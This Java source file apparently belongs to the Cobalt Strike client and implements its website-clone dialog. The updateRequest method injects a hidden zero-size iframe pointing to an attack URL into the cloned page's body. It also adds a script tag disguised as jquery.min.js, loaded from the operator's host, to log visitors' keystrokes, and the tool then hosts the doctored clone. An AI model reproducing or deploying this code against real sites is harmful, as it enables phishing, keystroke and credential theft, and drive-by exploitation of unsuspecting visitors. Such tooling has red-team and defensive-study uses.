package aggressor.dialogs;

import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.MultiFrame;
import common.Callback;
import common.CommonUtils;
import common.TeamQueue;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;
import java.util.Map;

public class CloneSiteDialog implements DialogListener,
        Callback {
    protected MultiFrame window;
    protected JFrame dialog = null;
    protected TeamQueue conn;
    protected DataManager datal;
    protected Map options;
    protected String desc;
    protected String proto;

    public CloneSiteDialog(MultiFrame window, TeamQueue conn, DataManager data) {
        this.window = window;
        this.conn = conn;
        this.datal = data;
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        this.options = options;
        this.proto = DialogUtils.bool(options, "ssl") ? "https://" : "http://";
        String cloneme = DialogUtils.string(options, "cloneme");
        this.conn.call("cloudstrike.clone_site", CommonUtils.args(cloneme), this);
    }

    public String updateRequest(String result, String attack, boolean capture) {
        String code;
        if (!"".equals(attack)) {
            code = "<IFRAME SRC=\"" + attack + "\" WIDTH=\"0\" HEIGHT=\"0\"></IFRAME>";
            if (!CommonUtils.isin(code, result = result.replaceFirst("(?i:</body>)", "\n" + code + "\n$0"))) {
                result = result + code;
            }
            this.desc = this.desc + ". Serves " + attack;
        }
        if (capture) {
            code = "<script src=\"" + this.proto + this.options.get("host") + ":" + DialogUtils.string(this.options, "port") + "/jquery/jquery.min.js\"></script>";
            if (!CommonUtils.isin(code, result = result.replaceFirst("(?i:</body>)", "\n" + code + "\n$0"))) {
                result = result + code;
            }
            this.desc = this.desc + ". Logs keys";
        }
        return result;
    }

    @Override
    public void result(String method, Object data) {
        String cloneme = DialogUtils.string(this.options, "cloneme");
        String attack = DialogUtils.string(this.options, "attack");
        String uri = DialogUtils.string(this.options, "uri");
        String host = DialogUtils.string(this.options, "host");
        String port = DialogUtils.string(this.options, "port");
        boolean ssl = DialogUtils.bool(this.options, "ssl");
        boolean capture = DialogUtils.bool(this.options, "capture");
        this.desc = "Clone of: " + cloneme;
        if ("cloudstrike.clone_site".equals(method)) {
            String result = (String) data;
            if (result.length() == 0) {
                DialogUtils.showError("Clone of " + cloneme + " is empty.\nTry to connect with HTTPS instead.");
            } else if (result.startsWith("error: ")) {
                DialogUtils.showError("Could not clone: " + cloneme + "\n" + result.substring(7));
            } else {
                result = this.updateRequest(result, attack, capture);
                this.conn.call("cloudstrike.host_site", CommonUtils.args(host, Integer.parseInt(port), ssl, uri, result, capture + "", this.desc, cloneme), this);
            }
        } else {
            String status = data + "";
            if ("success".equals(status)) {
                DialogUtils.startedWebService("cloned site", this.proto + host + ":" + port + uri);
            } else {
                DialogUtils.showError("Unable to start web server:\n" + status);
            }
        }
    }

    public void show() {
        this.dialog = DialogUtils.dialog("Clone Site", 640, 480);
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        controller.set("uri", "/");
        controller.set("port", "80");
        controller.set("host", DataUtils.getLocalIP(this.datal));
        controller.text("cloneme", "Clone URL:", 10);
        controller.text("uri", "Local URI:", 20);
        controller.text("host", "Local Host:", 20);
        controller.text("port", "Local Port:", 20);
        controller.site("attack", "Attack:", this.conn, this.datal);
        controller.checkbox_add("ssl", "SSL:", "Enable SSL", DataUtils.hasValidSSL(this.datal));
        controller.checkbox_add("capture", "", "Log keystrokes on cloned site", true);
        JButton ok = controller.action("Clone");
        JButton help = controller.help("https://www.cobaltstrike.com/help-website-clone-tool");
        this.dialog.add(DialogUtils.description("The site cloner copies a website and fixes the code so images load. You may add exploits to cloned sites or capture data submitted by visitors"), "North");
        this.dialog.add(controller.layout(), "Center");
        this.dialog.add(DialogUtils.center(ok, help), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}

